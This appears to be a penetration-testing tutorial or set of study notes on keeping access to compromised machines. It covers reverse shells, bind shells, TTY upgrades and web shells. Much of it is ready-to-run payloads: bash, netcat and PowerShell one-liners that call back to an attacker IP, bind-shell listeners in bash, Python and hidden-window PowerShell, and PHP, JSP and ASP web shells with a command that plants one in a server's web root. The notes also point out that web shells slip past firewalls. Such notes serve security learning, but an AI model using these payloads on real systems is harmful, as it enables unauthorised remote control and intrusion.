# Why get a shell?

Once you have a system comprised, you dont want to have to configureand execute the same exploit to return to the system. Using networking protocols like ssh for Linux or WinRm for windows can get you a command line interface for an ip, but you will need credentials for that. Finding a service running on a system that is vunerable to opening shells can leave the attacker with a convenient point of entry back the to target.


# Reverse Shell
If you find a system that us vulnerable to remote code execution, you execute commands on the target machine to connect back to your machine. On your machine you use netcat to listen on a port, then on the target machine you execute a payload for a windows shell or linux shell

Commands to run on your machine:

``` bash 

nc -lvnp <port-number> 
```

-l stands for listen, v is for verbose so netcat will print outpur updating us on the state of the connection, n blocks DNS resolution so our machine doesnt try to connect to a DNS server and translate the incoming ip to a domain name and waste time, and p allows you to specify a port.

payloads to run on target machine:

linux shells:
``` bash

	bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

or

``` bash
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f

```

windows shell:

``` powershell

	powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"

```

Note: Since reverse shells have the target machine sending requests to connect to our machine, once the connection is closed you will have to run the exploit again for RCE (Remote Code Execution)

# Bind Shell

The opposite of the reverse shell. You have to configure the target machine to start listening on a certain port, then you send a connection to those ports on the target machine.

Payloads to open a Bind Shell:

Bash

``` bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

Python 

``` python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'

```

Windows Powershell

``` powershell

powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```


On your machine, you connect to the port you set with the payload using netcat

``` bash
nc <ip-address> <port-number>
```


Note: Bind shells do not require the attacker to re-run the exploit because it is conifguring the target machine to passivley listen and wait for a connection. If we lose our connection, we can connect again with netcat

# Upgrading TTY

Once connected to another machine with netcat, you won't have the same conveniences available to you with a local shell. Namely naviagating the input efficiently by moving word by word or jumping to the end/startof a line. You will only be able to delete and add individual charecters. (You can also configure your .bashrc file to allow vim motions for inputs to the command line). In a normal TTY session, you will also not be able to hit the up arrow to access previous commands. You will need to upgrade the shell to have full terminal functionality with a method such as 'python/stty'


# WebShell

A webshell lets you see that output of your commands on the server from the public facing web page. It accepts commands through http parameters like 'GET' or 'POST', You have to write the payload to a file at the root of the webserver, then either curl the web server root or visit it in your browser. If you found a upload vunlnerability, you upload it to the root directory. With Remote Code Execution, you can write a new file directly to the root directory. 

 
Here are some payload examples:

php:
``` php
<?php system($_REQUEST["cmd"]); ?>
```

jsp:

``` jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

asp:

``` asp
<% eval request("cmd") %>
```


Here are some examples of the default web root you must write the payload to on common servers:


```

Web Server	Default Webroot
*********	***************

Apache		/var/www/html/
Nginx		/usr/local/nginx/html/
IIS		c:\inetpub\wwwroot\
XAMPP		C:\xampp\htdocs\

```




You write to a location with '>' but you first must 'echo' the command as a string. For example:


``` bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

This command creates a new file in the default root directory of an Apache Web server.

Webshells are quite nifty. They do not open up any new connections on other ports like a bind or reverse shell would on port 22. This means that a web shell would not trigger a firewall to block the connection since it runs of port 80 or 443 (http or https) for handling typically traffic. If the target host is rebooted, your webshell script will still exist in the root directory, allowing you to access the server as long as that file is still there. 

Webshells have their downsides though. Every new command must be intiated through a new http request via curl, so it can be cumbersome. You can write a python command line application to automatically create and send the http request for each command.

# Accessing the webshell

Be sure to add the argument when you curl or visit the payload you wrote to the root directoy.

An example with a php shell would look like this:

``` php 
$ curl http://SERVER_IP:PORT/shell.php?cmd=id
```

























